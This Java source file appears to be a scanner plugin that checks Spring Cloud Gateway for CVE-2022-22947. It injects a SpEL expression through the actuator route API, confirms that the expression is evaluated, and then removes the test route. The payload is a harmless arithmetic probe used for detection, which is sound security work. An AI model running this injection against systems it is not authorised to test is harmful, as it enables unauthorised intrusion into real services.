package plugins.vul.spring.cloud.gateway;

import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.requests.RawResponse;
import me.gv7.woodpecker.tools.misc.RandomUtil;

public class CVE_2022_22947_POC implements IPoc {
    private IScanResult scanResult = null;
    private IPluginHelper helper;
    private IVulPluginCallbacks callbacks;
    private String payload = "{\"id\":\"%s\",\"filters\":[{\"name\":\"AddResponseHeader\",\"args\":{\"name\":\"Result\",\"value\":\"#{%d*%d}\"}}],\"uri\":\"http://example.com\"}";

    public CVE_2022_22947_POC() {
        callbacks = CVE_2022_22947_Plugin.vulPluginCallbacks;
        helper = callbacks.getPluginHelper();
        scanResult = helper.createScanResult();
    }

    @Override
    public IScanResult doVerify(ITarget iTarget, IResultOutput iResultOutput) throws Throwable {
        // 获取url
        String url = iTarget.getAddress();
        url = url.endsWith("/") ? url.substring(0,url.length()-1) : url;

        if (!url.endsWith("/gateway")){
            url = url + "/actuator/gateway";
        }
        // 创建随机poc
        String randomStr = RandomUtil.getRandomString(8);
        int rand1 = RandomUtil.getRandomNumber(4);
        int rand2 = RandomUtil.getRandomNumber(4);

        // 创建路由
        RawResponse rawResponse = CVE_2022_22947_Plugin.createPocRoute(url,randomStr,String.format(payload, randomStr,rand1,rand2));
        if (rawResponse.statusCode() != 201){
            iResultOutput.failPrintln("create route failed");
            return scanResult;
        }

        // 刷新路由
        rawResponse = CVE_2022_22947_Plugin.refreshRoute(url+"/refresh");
        if (rawResponse.statusCode() != 200){
            iResultOutput.failPrintln("refresh route failed");
            return scanResult;
        }

        // 探测路由
        rawResponse = CVE_2022_22947_Plugin.verifyRoute(String.format("%s/routes/%s",url,randomStr));
        if (rawResponse.statusCode() != 200){
            iResultOutput.failPrintln("create route failed");
        }else {
            iResultOutput.infoPrintln("create route successfully");
            if (rawResponse.readToText().contains(Integer.toString(rand1*rand2))){
                iResultOutput.successPrintln("vulnerability exist!");
                scanResult.setTarget(rawResponse.url());
                scanResult.setExists(true);
                scanResult.setMsg("路由创建成功且存在表达式执行");
            } else {
                iResultOutput.infoPrintln("vulnerability does not exist!");
            }

            rawResponse = CVE_2022_22947_Plugin.deleteRoute(String.format("%s/routes/%s",url,randomStr));
            if (rawResponse.statusCode() == 200){
                iResultOutput.infoPrintln("delete route successfully");
            } else {
                iResultOutput.failPrintln("delete route failed");
            }
        }
        return scanResult;
    }
}
